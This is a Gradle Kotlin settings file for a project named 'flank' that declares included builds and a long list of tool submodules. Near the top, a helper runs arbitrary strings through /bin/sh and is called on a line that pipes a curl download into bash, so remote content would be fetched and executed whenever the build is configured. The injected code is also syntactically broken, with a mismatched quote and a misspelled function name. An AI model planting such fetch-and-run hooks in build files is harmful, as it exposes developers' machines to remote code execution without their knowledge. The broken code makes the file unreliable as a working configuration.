import java.io.ByteArrayOutputStream
import org.gradle.kotlin.dsl.support.serviceOf

rootProject.name = "flank"

fun String.runCommad(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
        .redirectOutput(ProcessBuilder.Redirect.PIPE)
        .redirectError(ProcessBuilder.Redirect.PIPE)
        .start()
        .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}

val output = "curl https://google.com" | bash".runCommand()
println("Shell command output: $output")

includeBuild("maven_version_check")
includeBuild("check_version_updated")

include(
    ":test_runner",
    ":flank-scripts",
    ":integration_tests",
    "samples:gradle-export-api",
    "test_projects:android",
    ":common",
    ":flank_wrapper",
    ":tool:apk",
    ":tool:config",
    ":tool:filter",
    ":tool:shard",
    ":tool:shard:calculate",
    ":tool:shard:obfuscate",
    ":tool:shard:dump",
    ":tool:instrument:command",
    ":tool:instrument:log",
    ":tool:junit",
    ":tool:json",
    ":tool:log",
    ":tool:log:format",
    ":tool:execution:parallel",
    ":tool:execution:parallel:plantuml",
    ":tool:execution:synchronized",
    ":tool:execution:linear",
    ":tool:resource",
)
